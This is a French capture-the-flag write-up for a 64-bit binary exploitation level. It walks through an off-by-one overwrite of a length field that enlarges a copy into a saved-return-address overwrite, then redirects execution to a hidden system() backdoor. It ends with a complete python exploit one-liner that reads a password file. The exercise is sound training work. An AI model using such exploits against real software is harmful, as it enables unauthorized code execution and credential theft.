# level 9 #

Bon la on est accueilli par un message qui nous annonce les securites suivantes : `Partial RELRO`, `pas de canary`, `NX`, `PIE`

L'executable est en 64 bits.

Quand on le lance, il demande un username, puis un message, en deux inputs.

Le `main()` ne fait que print un message d'accueil, et appeler `handle_msg()`.


```c
char tab[192];               // à [rbp-0xc0]
memset(tab + 140, 0, 40);    // met des 0 sur tab[140] a tab [179]
*(int *)(tab + 180) = 140;   // a l'emplacement 180, on met la valeur 140 (0x8c)
set_username(tab);
set_msg(tab);
```

En gros ici, `tab` est memset a 0, du 140eme au 179eme emplacement, et a l'emplacement 180, il stocke la valeur `140`.
Puis les fonctions `set_username()` et `set_message()` sont appelees avec `tab` comme parametre.

```c
fgets(s, 128, stdin);
for (i = 0; i <= 40 && s[i] != 0; ++i)
    a1[i + 140] = s[i];      // écrit tab[140 .. 180]
```

La fonction `set_username()` va recuperer notre input, pour une taille maximale de 128 bytes, et en placer 41 bytes dans tab (ici `a1`), du 140eme emplacement au 180eme emplacement.

Or, on sait que l'emplacement 180 contenait la valeur 140. Il est donc possible de reecrire cette valeur, en la remplacant via le 41eme byte de notre premier input.

La fonction `set_msg()` est ensuite appelee. 

```c
fgets(s, 1024, stdin);
return strncpy(a1, s, *(int *)(a1 + 180));  
```

Cette fonction recupere un input de stdin, d'une taille allant jusqu a 1024bytes. Notre input est ensuite inscrit dans `a1`(tab encore une fois), du debut du tableau, jusqu'a la valeur contenue a `a1` + 180, soit a l'origine, 140. 

Donc notre deuxieme input devrait etre stocke au 140 premiers bytes de tab. Mais comme on peut reecrire la valeur 140, on peut pousser cette limite a 255.

Donc on pourrait theoriquement reecrire le saved rip de la fonction `handle_msg()`, en debordant de `tab` pour rediriger vers une autre fonction : `secret_backdoor()` qui appelle system avec un input passe en parametre par nos soins.

```c
int secret_backdoor(void) {
    char s[128];
    fgets(s, 128, stdin);
    return system(s);        
}
```

Cette fonction est jamais appellee, mais c'est la que la protection `PIE` nous pose probleme. A l'objdump de l'executable, on ne voit pas les adresses des fonctions, il faut les calculer. 

Comme l'ASLR n'est toujours pas active, on peut calculer l'adresse de la fonction en recuperant la premiere adresse utilisee par l'executable sur la stackk, et en y ajoutant l'offset auquel se trouve la fonction, pour creer une adresse sur 64bits reutilisable entre les differents appels.

```
base           = 0x555555554000
secret_backdoor = 0x555555554000 + 0x88c = 0x55555555488c
```

Maintenant qu'on a l'adresse vers laquelle on veut rediriger, il faut calculer l'adresse a laquelle on veut l'ecrire.

Pour ca, il faut recuperer l'adresse du debut de `tab` et l'adresse du `saved rip` via info frames dans gdb, ce qui nous donne `200`.

Donc si on ecrit 200 bytes dans tab, on peut ensuite ecrire 8 bytes pour rediriger l'execution vers `secret_backdoor()`.

On doit donc entrer les inputs suivants : 
- pour username : 'A'*40 + '\xFF'                     
- message  : 'B'*200 + l'adresse de secret_backdoor() `(0x55555555488c)`      
- pour l'argument de `system()` : cat /home/users/end/.pass         

## Exploit final

```bash
python -c 'print("A"*40 + "\xff"); print("B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"); print("cat /home/users/end/.pass")'| ./level09
```